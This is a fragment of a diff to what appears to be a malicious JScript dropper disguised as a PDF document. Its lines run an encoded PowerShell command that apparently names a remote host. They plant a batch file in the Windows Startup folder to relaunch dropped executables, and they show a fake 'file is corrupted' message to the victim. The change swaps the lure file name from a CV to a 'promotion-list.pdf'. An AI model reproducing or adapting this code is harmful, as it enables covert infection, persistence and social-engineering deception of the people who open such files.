@@ -13,5 +13,5 @@ sh1.Run('powershell -EncodedCommand JABoAG8AcwB0ADEAPQAiADUANAAuADcAMgAuADEANwAx
 
 sh2.Run('cmd /c echo C:\\Windows\\Tasks\\alksdfj.exe C:\\Windows\\Tasks\\javascript.js >> %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup\\javascript.bat',0,false)
 
-WScript.Echo("File CV-Katarzyna-Budzynska.pdf is corrupted. Please use another file.");
+WScript.Echo("File promotion-list.pdf is corrupted. Please use another file.");
     WScript.Quit(1); //
